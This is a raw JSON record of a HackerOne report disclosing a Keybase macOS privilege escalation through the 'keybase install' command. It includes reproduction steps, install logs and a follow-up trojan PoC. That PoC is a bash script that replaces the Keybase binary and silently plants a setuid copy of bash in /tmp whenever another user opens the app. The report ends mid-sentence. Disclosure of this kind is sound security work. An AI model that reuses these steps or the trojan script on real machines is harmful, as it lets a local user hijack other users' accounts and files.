{"id":471739,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80NzE3Mzk=","url":"https://hackerone.com/reports/471739","title":"macOS privilege escalation via keybase install","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2018-12-24T18:02:12.623Z","submitted_at":"2018-12-24T18:02:12.623Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"mirchr","url":"/mirchr","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/d5WVwYt8n5pYhhom1mNPokFG/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":2809,"url":"https://hackerone.com/keybase","handle":"keybase","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/809/710eb42880bb34c06cab0d1d5081488ec59aec5e_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/809/710eb42880bb34c06cab0d1d5081488ec59aec5e_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Keybase","twitter_handle":"keybaseio","website":"https://keybase.io","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2019-01-30T18:33:06.626Z","bug_reporter_agreed_on_going_public_at":"2019-01-30T18:33:06.556Z","team_member_agreed_on_going_public_at":"2019-01-30T18:14:59.043Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"### Environment\nOS: macOS Mojave 10.14.1\nKernel: Darwin Kernel Version 18.2.0\n\nkeybase version 2.12.2-20181218171841+29273f4110\n\n### Steps to reproduce\n\nNote: All steps are executed as an unprivileged user unless otherwise noted.\n\nFor this PoC the unprivileged user is defined as below\n```\n$ id test2\nuid=508(test2) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),100(_lpoperator),701(com.apple.sharepoint.group.1),703(com.apple.sharepoint.group.3),702(com.apple.sharepoint.group.2)\n```\n\n1) Show that the application files are owned by the admin user who installed it\n```\n$ ls -ld /Applications/Keybase.app /Applications/Keybase.app/Contents/MacOS/Keybase /Applications/Keybase.app/Contents/SharedSupport/bin/keybase\ndrwxr-xr-x@ 3 admin  admin        96 Dec 18 11:25 /Applications/Keybase.app\n-rwxr-xr-x@ 1 admin  admin     27680 Dec 18 11:25 /Applications/Keybase.app/Contents/MacOS/Keybase\n-rwxr-xr-x@ 1 admin  admin  85209360 Dec 18 11:25 /Applications/Keybase.app/Contents/SharedSupport/bin/keybase\n```\n\n2) Manually download the latest release version\n```\nwget https://prerelease.keybase.io/darwin-updates/Keybase-2.12.2-20181218171841%2B29273f4110.zip\n```\n3) Extract the application\n\nunzip Keybase-2.12.2-20181218171841+29273f4110.zip\n\n4) Execute the Keybase Application. Logging in is not necessary.\n```\n/Applications/Keybase.app/Contents/MacOS/Keybase # or use Finder\n```\n5) Execute keybase install pointing the source-path to the location of the unzipped application. The key here is to pass two --source-path options with the the first occurrence pointing to an invalid path.\n```\n# line breaks added for readability\n/Applications/Keybase.app/Contents/SharedSupport/bin/keybase -d install \\\n-f \\\n--source-path=/does/not/exist \\\n-c app \\\n--source-path=$PWD/Keybase.app\n```\n\nLog output\n```\n2018-12-24T11:39:03.086210-06:00 ▶ [DEBU keybase globals.go:491] 001 Created Identify2Cache, max age: 5m0s\n2018-12-24T11:39:03.086338-06:00 ▶ [DEBU keybase globals.go:494] 002 Created LinkCache, max size: 4000, clean dur: 1m0s\n2018-12-24T11:39:03.086395-06:00 ▶ [DEBU keybase globals.go:496] 003 Created CardCache, max age: 5m0s\n2018-12-24T11:39:03.086438-06:00 ▶ [DEBU keybase globals.go:514] 004 made a new full self cache\n2018-12-24T11:39:03.087220-06:00 ▶ [DEBU keybase globals.go:516] 005 made a new cached UPAK loader (timeout=10m0s)\n2018-12-24T11:39:03.091820-06:00 ▶ [DEBU keybase ui.go:614] 006 Setting GPG_TTY to /dev/ttys005\n2018-12-24T11:39:03.091980-06:00 ▶ [DEBU keybase secret_store.go:153] 007 NewSecretStoreLocked: using os-specific SecretStore\n2018-12-24T11:39:03.092051-06:00 ▶ [DEBU keybase globals.go:427] 008 Keybase CLI 2.12.2-20181218171841+29273f4110\n2018-12-24T11:39:03.092074-06:00 ▶ [DEBU keybase globals.go:427] 009 - Built with go1.10.3\n2018-12-24T11:39:03.092087-06:00 ▶ [DEBU keybase globals.go:427] 00a - Visit https://keybase.io for more details\n2018-12-24T11:39:03.100194-06:00 ▶ [DEBU keybase main.go:208] 00b + configureProcesses\n2018-12-24T11:39:03.100289-06:00 ▶ [DEBU keybase main.go:319] 00c + configureLogging\n2018-12-24T11:39:03.100327-06:00 ▶ [DEBU keybase main.go:328] 00d Disabling log forwarding\n2018-12-24T11:39:03.100343-06:00 ▶ [DEBU keybase main.go:321] 00e - configureLogging\n2018-12-24T11:39:03.100357-06:00 ▶ [DEBU keybase main.go:210] 00f - configureProcesses -\u003e \u003cnil\u003e\n2018-12-24T11:39:03.100520-06:00 ▶ [DEBU keybase install_darwin.go:484] 010 Installing components: [app]\n2018-12-24T11:39:03.100586-06:00 ▶ [INFO keybase app.go:142] 011 Install app bundle\n2018-12-24T11:39:06.975310-06:00 ▶ [DEBU keybase app.go:77] 012 Output ([--debug --run-mode=prod --app-path=/Applications/Keybase.app --timeout=10 --install-app-bundle --source-path=/Users/test2/update/Keybase.app]): 12.24.2018 11:39:03.244 Installer:56[DEBG] Version: 1.1.64\n12.24.2018 11:39:03.277 KBInstaller:27[DEBG] Installables: (\n    \"Privileged Helper\",\n    App\n)\n12.24.2018 11:39:03.277 KBInstaller:32[DEBG] Install: Privileged Helper\n12.24.2018 11:39:03.278 KBHelperTool:73[INFO] Connecting to keybase.Helper (privileged=1)\n12.24.2018 11:39:03.278 KBHelperTool:73[INFO] Connected\n12.24.2018 11:39:03.499 KBHelperTool:118[DEBG] Helper version: {\n    build = 3;\n    version = \"1.0.32\";\n}\n12.24.2018 11:39:03.523 KBHelperTool:118[DEBG] Helper version: {\n    build = 3;\n    version = \"1.0.32\";\n}\n12.24.2018 11:39:03.532 KBInstaller:32[DEBG] Install: App\n12.24.2018 11:39:03.532 KBAppBundle:82[INFO] Checking security requirements\n12.24.2018 11:39:05.164 KBAppBundle:89[INFO] Copying app bundle /Users/test2/update/Keybase.app to /Applications/Keybase.app\n12.24.2018 11:39:05.544 KBAppBundle:98[INFO] Checking destination\n12.24.2018 11:39:06.969 KBInstaller:45[INFO] Install complete\n12.24.2018 11:39:06.969 KBInstaller:49[INFO] Privileged Helper: Installed, Bundle Version: 1.0.32\nVersion: 1.0.32\n12.24.2018 11:39:06.969 KBInstaller:49[INFO] App:\n12.24.2018 11:39:06.969 Installer:96[INFO] Exit(0)\n2018-12-24T11:39:06.975976-06:00 ▶ [DEBU keybase out_of_date.go:14] 013 + PrintOutOfDateWarnings\n2018-12-24T11:39:06.976240-06:00 ▶ [DEBU keybase socket.go:65] 014 + GetSocket\n2018-12-24T11:39:06.976593-06:00 ▶ [DEBU keybase rpc.go:25] 015 - GetSocket -\u003e ok\n2018-12-24T11:39:06.976753-06:00 ▶ [DEBU keybase socket.go:75] 016 | empty socket wrapper; need a new one\n2018-12-24T11:39:06.976818-06:00 ▶ [DEBU keybase socket_nix.go:100] 017 + SocketInfo#dialSocket(unix:/Users/test2/Library/Group Containers/keybase/Library/Caches/Keybase/keybased.sock)\n2018-12-24T11:39:06.976889-06:00 ▶ [DEBU keybase socket_nix.go:124] 018 | net.Dial(unix:/Users/test2/Library/Group Containers/keybase/Library/Caches/Keybase/keybased.sock)\n2018-12-24T11:39:06.977905-06:00 ▶ [DEBU keybase socket_nix.go:125] 019 - SocketInfo#dialSocket(unix:/Users/test2/Library/Group Containers/keybase/Library/Caches/Keybase/keybased.sock) -\u003e ERROR: dial unix /Users/test2/Library/Group Containers/keybase/Library/Caches/Keybase/keybased.sock: connect: no such file or directory\n2018-12-24T11:39:06.977981-06:00 ▶ [DEBU keybase socket_nix.go:100] 01a + SocketInfo#dialSocket(unix:/Users/test2/Library/Caches/Keybase/keybased.sock)\n2018-12-24T11:39:06.978016-06:00 ▶ [DEBU keybase socket_nix.go:124] 01b | net.Dial(unix:/Users/test2/Library/Caches/Keybase/keybased.sock)\n2018-12-24T11:39:06.978187-06:00 ▶ [DEBU keybase socket_nix.go:125] 01c - SocketInfo#dialSocket(unix:/Users/test2/Library/Caches/Keybase/keybased.sock) -\u003e ERROR: dial unix /Users/test2/Library/Caches/Keybase/keybased.sock: connect: no such file or directory\n2018-12-24T11:39:06.978270-06:00 ▶ [DEBU keybase socket.go:90] 01d | DialSocket -\u003e ERROR: There were multiple errors: dial unix /Users/test2/Library/Group Containers/keybase/Library/Caches/Keybase/keybased.sock: connect: no such file or directory; dial unix /Users/test2/Library/Caches/Keybase/keybased.sock: connect: no such file or directory\n2018-12-24T11:39:06.978299-06:00 ▶ [DEBU keybase out_of_date.go:19] 01e Ignoring error in printOutOfDateWarnings: There were multiple errors: dial unix /Users/test2/Library/Group Containers/keybase/Library/Caches/Keybase/keybased.sock: connect: no such file or directory; dial unix /Users/test2/Library/Caches/Keybase/keybased.sock: connect: no such file or directory\n2018-12-24T11:39:06.978386-06:00 ▶ [DEBU keybase out_of_date.go:20] 01f - PrintOutOfDateWarnings\n2018-12-24T11:39:07.090071-06:00 ▶ [DEBU keybase globals.go:657] 020 GlobalContext#Shutdown(0xc4203a5400)\n2018-12-24T11:39:07.090332-06:00 ▶ [DEBU keybase globals.go:701] 021 exiting shutdown code=0; err=\u003cnil\u003e\n```\n6) Verify the permissions of keybase. The low privileged test2 user now owns all files under /Applications/Keybase.app. At this point the low privileged user has full control of all binaries and configuration files. These files could be modified by a malicious low privileged user to install a trojan horse to execute arbitrary code as an unsuspecting user. I believe there could also be a path to arbitrary code execution as root but additional research is necessary.\n```\n$ ls -ld /Applications/Keybase.app /Applications/Keybase.app/Contents/MacOS/Keybase /Applications/Keybase.app/Contents/SharedSupport/\ndrwxr-xr-x  3 test2  staff     96 Dec 18 11:25 /Applications/Keybase.app\n-rwxr-xr-x  1 test2  staff  27680 Dec 18 11:25 /Applications/Keybase.app/Contents/MacOS/Keybase\ndrwxr-xr-x  3 test2  staff     96 Dec 18 11:25 /Applications/Keybase.app/Contents/SharedSupport/\n```\n\n## Impact\n\nArbitrary code execution as any user running Keybase is possible which impacts the confidentially, integrity, and availability of the system and users.","vulnerability_information_html":"\u003ch3 id=\"environment\"\u003eEnvironment\u003c/h3\u003e\n\n\u003cp\u003eOS: macOS Mojave 10.14.1\u003cbr\u003e\nKernel: Darwin Kernel Version 18.2.0\u003c/p\u003e\n\n\u003cp\u003ekeybase version 2.12.2-20181218171841+29273f4110\u003c/p\u003e\n\n\u003ch3 id=\"steps-to-reproduce\"\u003eSteps to reproduce\u003c/h3\u003e\n\n\u003cp\u003eNote: All steps are executed as an unprivileged user unless otherwise noted.\u003c/p\u003e\n\n\u003cp\u003eFor this PoC the unprivileged user is defined as below\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ id test2\nuid=508(test2) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),100(_lpoperator),701(com.apple.sharepoint.group.1),703(com.apple.sharepoint.group.3),702(com.apple.sharepoint.group.2)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e1) Show that the application files are owned by the admin user who installed it\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ ls -ld /Applications/Keybase.app /Applications/Keybase.app/Contents/MacOS/Keybase /Applications/Keybase.app/Contents/SharedSupport/bin/keybase\ndrwxr-xr-x@ 3 admin  admin        96 Dec 18 11:25 /Applications/Keybase.app\n-rwxr-xr-x@ 1 admin  admin     27680 Dec 18 11:25 /Applications/Keybase.app/Contents/MacOS/Keybase\n-rwxr-xr-x@ 1 admin  admin  85209360 Dec 18 11:25 /Applications/Keybase.app/Contents/SharedSupport/bin/keybase\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e2) Manually download the latest release version\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ewget https://prerelease.keybase.io/darwin-updates/Keybase-2.12.2-20181218171841%2B29273f4110.zip\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e3) Extract the application\u003c/p\u003e\n\n\u003cp\u003eunzip Keybase-2.12.2-20181218171841+29273f4110.zip\u003c/p\u003e\n\n\u003cp\u003e4) Execute the Keybase Application. Logging in is not necessary.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e/Applications/Keybase.app/Contents/MacOS/Keybase # or use Finder\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e5) Execute keybase install pointing the source-path to the location of the unzipped application. The key here is to pass two --source-path options with the the first occurrence pointing to an invalid path.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e# line breaks added for readability\n/Applications/Keybase.app/Contents/SharedSupport/bin/keybase -d install \\\n-f \\\n--source-path=/does/not/exist \\\n-c app \\\n--source-path=$PWD/Keybase.app\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eLog output\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e2018-12-24T11:39:03.086210-06:00 ▶ [DEBU keybase globals.go:491] 001 Created Identify2Cache, max age: 5m0s\n2018-12-24T11:39:03.086338-06:00 ▶ [DEBU keybase globals.go:494] 002 Created LinkCache, max size: 4000, clean dur: 1m0s\n2018-12-24T11:39:03.086395-06:00 ▶ [DEBU keybase globals.go:496] 003 Created CardCache, max age: 5m0s\n2018-12-24T11:39:03.086438-06:00 ▶ [DEBU keybase globals.go:514] 004 made a new full self cache\n2018-12-24T11:39:03.087220-06:00 ▶ [DEBU keybase globals.go:516] 005 made a new cached UPAK loader (timeout=10m0s)\n2018-12-24T11:39:03.091820-06:00 ▶ [DEBU keybase ui.go:614] 006 Setting GPG_TTY to /dev/ttys005\n2018-12-24T11:39:03.091980-06:00 ▶ [DEBU keybase secret_store.go:153] 007 NewSecretStoreLocked: using os-specific SecretStore\n2018-12-24T11:39:03.092051-06:00 ▶ [DEBU keybase globals.go:427] 008 Keybase CLI 2.12.2-20181218171841+29273f4110\n2018-12-24T11:39:03.092074-06:00 ▶ [DEBU keybase globals.go:427] 009 - Built with go1.10.3\n2018-12-24T11:39:03.092087-06:00 ▶ [DEBU keybase globals.go:427] 00a - Visit https://keybase.io for more details\n2018-12-24T11:39:03.100194-06:00 ▶ [DEBU keybase main.go:208] 00b + configureProcesses\n2018-12-24T11:39:03.100289-06:00 ▶ [DEBU keybase main.go:319] 00c + configureLogging\n2018-12-24T11:39:03.100327-06:00 ▶ [DEBU keybase main.go:328] 00d Disabling log forwarding\n2018-12-24T11:39:03.100343-06:00 ▶ [DEBU keybase main.go:321] 00e - configureLogging\n2018-12-24T11:39:03.100357-06:00 ▶ [DEBU keybase main.go:210] 00f - configureProcesses -\u0026gt; \u0026lt;nil\u0026gt;\n2018-12-24T11:39:03.100520-06:00 ▶ [DEBU keybase install_darwin.go:484] 010 Installing components: [app]\n2018-12-24T11:39:03.100586-06:00 ▶ [INFO keybase app.go:142] 011 Install app bundle\n2018-12-24T11:39:06.975310-06:00 ▶ [DEBU keybase app.go:77] 012 Output ([--debug --run-mode=prod --app-path=/Applications/Keybase.app --timeout=10 --install-app-bundle --source-path=/Users/test2/update/Keybase.app]): 12.24.2018 11:39:03.244 Installer:56[DEBG] Version: 1.1.64\n12.24.2018 11:39:03.277 KBInstaller:27[DEBG] Installables: (\n    \u0026quot;Privileged Helper\u0026quot;,\n    App\n)\n12.24.2018 11:39:03.277 KBInstaller:32[DEBG] Install: Privileged Helper\n12.24.2018 11:39:03.278 KBHelperTool:73[INFO] Connecting to keybase.Helper (privileged=1)\n12.24.2018 11:39:03.278 KBHelperTool:73[INFO] Connected\n12.24.2018 11:39:03.499 KBHelperTool:118[DEBG] Helper version: {\n    build = 3;\n    version = \u0026quot;1.0.32\u0026quot;;\n}\n12.24.2018 11:39:03.523 KBHelperTool:118[DEBG] Helper version: {\n    build = 3;\n    version = \u0026quot;1.0.32\u0026quot;;\n}\n12.24.2018 11:39:03.532 KBInstaller:32[DEBG] Install: App\n12.24.2018 11:39:03.532 KBAppBundle:82[INFO] Checking security requirements\n12.24.2018 11:39:05.164 KBAppBundle:89[INFO] Copying app bundle /Users/test2/update/Keybase.app to /Applications/Keybase.app\n12.24.2018 11:39:05.544 KBAppBundle:98[INFO] Checking destination\n12.24.2018 11:39:06.969 KBInstaller:45[INFO] Install complete\n12.24.2018 11:39:06.969 KBInstaller:49[INFO] Privileged Helper: Installed, Bundle Version: 1.0.32\nVersion: 1.0.32\n12.24.2018 11:39:06.969 KBInstaller:49[INFO] App:\n12.24.2018 11:39:06.969 Installer:96[INFO] Exit(0)\n2018-12-24T11:39:06.975976-06:00 ▶ [DEBU keybase out_of_date.go:14] 013 + PrintOutOfDateWarnings\n2018-12-24T11:39:06.976240-06:00 ▶ [DEBU keybase socket.go:65] 014 + GetSocket\n2018-12-24T11:39:06.976593-06:00 ▶ [DEBU keybase rpc.go:25] 015 - GetSocket -\u0026gt; ok\n2018-12-24T11:39:06.976753-06:00 ▶ [DEBU keybase socket.go:75] 016 | empty socket wrapper; need a new one\n2018-12-24T11:39:06.976818-06:00 ▶ [DEBU keybase socket_nix.go:100] 017 + SocketInfo#dialSocket(unix:/Users/test2/Library/Group Containers/keybase/Library/Caches/Keybase/keybased.sock)\n2018-12-24T11:39:06.976889-06:00 ▶ [DEBU keybase socket_nix.go:124] 018 | net.Dial(unix:/Users/test2/Library/Group Containers/keybase/Library/Caches/Keybase/keybased.sock)\n2018-12-24T11:39:06.977905-06:00 ▶ [DEBU keybase socket_nix.go:125] 019 - SocketInfo#dialSocket(unix:/Users/test2/Library/Group Containers/keybase/Library/Caches/Keybase/keybased.sock) -\u0026gt; ERROR: dial unix /Users/test2/Library/Group Containers/keybase/Library/Caches/Keybase/keybased.sock: connect: no such file or directory\n2018-12-24T11:39:06.977981-06:00 ▶ [DEBU keybase socket_nix.go:100] 01a + SocketInfo#dialSocket(unix:/Users/test2/Library/Caches/Keybase/keybased.sock)\n2018-12-24T11:39:06.978016-06:00 ▶ [DEBU keybase socket_nix.go:124] 01b | net.Dial(unix:/Users/test2/Library/Caches/Keybase/keybased.sock)\n2018-12-24T11:39:06.978187-06:00 ▶ [DEBU keybase socket_nix.go:125] 01c - SocketInfo#dialSocket(unix:/Users/test2/Library/Caches/Keybase/keybased.sock) -\u0026gt; ERROR: dial unix /Users/test2/Library/Caches/Keybase/keybased.sock: connect: no such file or directory\n2018-12-24T11:39:06.978270-06:00 ▶ [DEBU keybase socket.go:90] 01d | DialSocket -\u0026gt; ERROR: There were multiple errors: dial unix /Users/test2/Library/Group Containers/keybase/Library/Caches/Keybase/keybased.sock: connect: no such file or directory; dial unix /Users/test2/Library/Caches/Keybase/keybased.sock: connect: no such file or directory\n2018-12-24T11:39:06.978299-06:00 ▶ [DEBU keybase out_of_date.go:19] 01e Ignoring error in printOutOfDateWarnings: There were multiple errors: dial unix /Users/test2/Library/Group Containers/keybase/Library/Caches/Keybase/keybased.sock: connect: no such file or directory; dial unix /Users/test2/Library/Caches/Keybase/keybased.sock: connect: no such file or directory\n2018-12-24T11:39:06.978386-06:00 ▶ [DEBU keybase out_of_date.go:20] 01f - PrintOutOfDateWarnings\n2018-12-24T11:39:07.090071-06:00 ▶ [DEBU keybase globals.go:657] 020 GlobalContext#Shutdown(0xc4203a5400)\n2018-12-24T11:39:07.090332-06:00 ▶ [DEBU keybase globals.go:701] 021 exiting shutdown code=0; err=\u0026lt;nil\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e6) Verify the permissions of keybase. The low privileged test2 user now owns all files under /Applications/Keybase.app. At this point the low privileged user has full control of all binaries and configuration files. These files could be modified by a malicious low privileged user to install a trojan horse to execute arbitrary code as an unsuspecting user. I believe there could also be a path to arbitrary code execution as root but additional research is necessary.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ ls -ld /Applications/Keybase.app /Applications/Keybase.app/Contents/MacOS/Keybase /Applications/Keybase.app/Contents/SharedSupport/\ndrwxr-xr-x  3 test2  staff     96 Dec 18 11:25 /Applications/Keybase.app\n-rwxr-xr-x  1 test2  staff  27680 Dec 18 11:25 /Applications/Keybase.app/Contents/MacOS/Keybase\ndrwxr-xr-x  3 test2  staff     96 Dec 18 11:25 /Applications/Keybase.app/Contents/SharedSupport/\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eArbitrary code execution as any user running Keybase is possible which impacts the confidentially, integrity, and availability of the system and users.\u003c/p\u003e\n","bounty_amount":"1250.0","formatted_bounty":"$1,250","weakness":{"id":75,"name":"Privilege Escalation"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":12,"voters":["mirchr","bl4de","mygf","asad0x01_","khizer47","cyberunit","codeanddecode","omespino","cryptographer","b73772bded7541989b54f6a","and 2 more..."],"severity":{"rating":"medium","score":6.3,"author_type":"Team","metrics":{"attack_vector":"local","attack_complexity":"low","privileges_required":"low","user_interaction":"none","scope":"changed","confidentiality":"low","integrity":"low","availability":"low"}},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":3887188,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Can you explain what the technique was?","markdown_message":"\u003cp\u003eCan you explain what the technique was?\u003c/p\u003e\n","automated_response":false,"created_at":"2018-12-24T18:12:58.270Z","updated_at":"2018-12-24T18:12:58.270Z","actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3887236,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@maxtaco \n\nOriginally I was testing an older version from mid October and I found I could upgrade the installation as a low privileged user by running keybase update check. During that process I noticed it upgraded privileges by specifying the -c app option to keybase install. The end result was an updated version and also the low privileged user owning  all files under /Applications/Keybase.app.\n\nThe second test was to reset the version back as an admin user and try the upgrade using the keybase install -c app option with --source-path pointing to a copy of the latest Keybase.app. The result was the same.\n\nThe next test was to try this with the latest version which initially failed. I am not sure if it's because it's the same version therefore the upgrade process exits early. I also tried with the force(-f) option but that also failed. For unknown reasons at this point, if I pass in two --source-path options with the first set to an invalid path the update proceeds with results in the low privileged account ownership of all files under /Applications/Keybase.app. I still need to review the source code to fully understand why this is happening.","markdown_message":"\u003cp\u003e\u003ca href=\"/maxtaco\"\u003e@maxtaco\u003c/a\u003e \u003c/p\u003e\n\n\u003cp\u003eOriginally I was testing an older version from mid October and I found I could upgrade the installation as a low privileged user by running keybase update check. During that process I noticed it upgraded privileges by specifying the -c app option to keybase install. The end result was an updated version and also the low privileged user owning  all files under /Applications/Keybase.app.\u003c/p\u003e\n\n\u003cp\u003eThe second test was to reset the version back as an admin user and try the upgrade using the keybase install -c app option with --source-path pointing to a copy of the latest Keybase.app. The result was the same.\u003c/p\u003e\n\n\u003cp\u003eThe next test was to try this with the latest version which initially failed. I am not sure if it\u0026#39;s because it\u0026#39;s the same version therefore the upgrade process exits early. I also tried with the force(-f) option but that also failed. For unknown reasons at this point, if I pass in two --source-path options with the first set to an invalid path the update proceeds with results in the low privileged account ownership of all files under /Applications/Keybase.app. I still need to review the source code to fully understand why this is happening.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-12-24T18:37:24.016Z","updated_at":"2018-12-24T18:37:24.016Z","actor":{"username":"mirchr","cleared":true,"url":"/mirchr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/d5WVwYt8n5pYhhom1mNPokFG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3887322,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Ok thank you for the report.  We will investigate further after the holiday!","markdown_message":"\u003cp\u003eOk thank you for the report.  We will investigate further after the holiday!\u003c/p\u003e\n","automated_response":false,"created_at":"2018-12-24T19:30:26.004Z","updated_at":"2018-12-24T19:30:26.004Z","actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3887452,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"(deleted a mistaken comment)","markdown_message":"\u003cp\u003e(deleted a mistaken comment)\u003c/p\u003e\n","automated_response":false,"created_at":"2018-12-24T20:35:10.815Z","updated_at":"2018-12-24T20:40:35.439Z","actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3887457,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Ah, my colleague explained this is a way userA might muck with userB's install. Got it...","markdown_message":"\u003cp\u003eAh, my colleague explained this is a way userA might muck with userB\u0026#39;s install. Got it...\u003c/p\u003e\n","automated_response":false,"created_at":"2018-12-24T20:39:03.895Z","updated_at":"2018-12-24T20:39:03.895Z","actor":{"username":"maxtaco","cleared":false,"url":"/maxtaco","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"keybase","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3887775,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Correct. An unprivileged user does not have rights to install applications to /Applications. For example when I tired to do it with Keybase, macOS prompted me for admin credentials. \n{F396779}\nHowever, the low privileged can execute the keybase install command to install the Keybase application while also retaining ownership of all files.\n \nA quick way to demo the risk this introduces is to install a trojan horse as the low privileged user. Replace the Keybase application with a malicious application. This PoC is a simple shell script. Once installed, any user that executes Keybase will also create a setuid shell in /tmp while also executing the original application. The unsuspecting victim will be unaware that a setuid shell is created. \n\n1) Rename the original Keybase application\n```\ncd /Applications/Keybase.app/Contents/MacOS\nmv Keybase Keybase.orig\n```\n2) Create a script named Keybase with the following logic\n```\n#!/bin/bash\n\n# create a setuid shell as the calling user\n/bin/cp /bin/bash /tmp/$(logname).shell\n/bin/chmod 4755 /tmp/$(logname).shell\n\n# execute the real Keybase app\n/Applications/Keybase.app/Contents/MacOS/Keybase.orig $*\n```\n3) Make the script executable\n```\nchmod 755 Keybase\n```\n\n4) As another user login and open Keybase. For this PoC I also created a file named secret.file in the home directory and set the permissions 600.\n\n5) As test2 check to see if the setuid shell has been created.\n\n```\n$ ls -ld /tmp/admin.shell\n-rwsr-xr-x  1 admin  wheel  618416 Dec 24 20:06 /tmp/admin.shell\n```\n\n6) Show that test2 does not have permission to read the secret file\n```\n$ cat /Users/admin/secret.file\ncat: /Users/admin/secret.file: Permission denied\n```\n\n7) Execute the setuid shell. Noticed euid=501 which gives full access to the victims files.\n```\n$ /tmp/admin.shell -p\nadmin.shell-3.2$ id\nuid=508(test2) gid=20(staff) euid=501(admin) groups=20(staff),12(everyone),61(localaccounts),704(com.apple.sharepoint.group.4),100(_lpoperator),701(com.apple.sharepoint.group.1),703(com.apple.sharepoint.group.3),702(com.apple.sharepoint.group.2)\n```\n\n8) Read the secret file\n```\nadmin.shell-3.2$ ls -ld /Users/admin/secret.file\n-rw-------  1 admin  staff  18 Dec 24 20:26 /Users/admin/secret.file\n\nadmin.shell-3.2$ cat /Users/admin/secret.file\nthis is a secret\n```\n9) Write to the secret file\n```\nadmin.shell-3.2$ echo woot \u003e\u003e /Users/admin/secret.file\nadmin.shell-3.2$ ls -ld /Users/admin/secret.file\n-rw-------  1 admin  staff  23 Dec 24 20:45 /Users/admin/secret.file\nadmin.shell-3.2$ cat /Users/admin/secret.file\nthis is a secret;\nwoot\n```\n\nBecause arbitrary code can be added there are many other malicious tasks could be accomplished to the trojan horse such as\n* steal 